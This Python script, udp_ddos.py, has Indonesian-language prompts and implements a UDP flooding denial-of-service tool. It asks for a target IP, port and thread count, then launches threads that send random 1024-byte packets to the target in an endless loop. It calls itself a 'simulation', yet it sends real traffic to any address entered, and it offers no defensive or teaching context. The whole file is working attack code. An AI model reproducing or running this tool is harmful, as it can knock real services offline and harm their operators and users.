# udp_ddos.py
import socket
import random
import threading
import time

def jalankan_ddos(target_ip, target_port, jumlah_thread):
    payload = random._urandom(1024)

    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock.sendto(payload, (target_ip, target_port))
                print(f"[+] Paket terkirim ke {target_ip}:{target_port}")
            except:
                pass

    for i in range(jumlah_thread):
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()

    print(f"\n🔥 Simulasi DDoS berjalan ke {target_ip}:{target_port} dengan {jumlah_thread} thread.")
    print("Tekan Ctrl+C untuk menghentikan.\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n❌ Script dihentikan oleh pengguna.")

while True:
    try:
        target_ip = input("Masukkan IP target: ")
        target_port = int(input("Masukkan port target: "))
        jumlah_thread = int(input("Masukkan jumlah thread: "))

        jalankan_ddos(target_ip, target_port, jumlah_thread)

        ulang = input("\n🔁 Ingin menjalankan ulang? (y/n): ").lower()
        if ulang != 'y':
            print("🚪 Keluar dari program.")
            break
    except KeyboardInterrupt:
        print("\n❌ Script dihentikan oleh pengguna.")
        break
    except Exception as e:
        print(f"\n⚠️ Terjadi kesalahan: {e}\n")
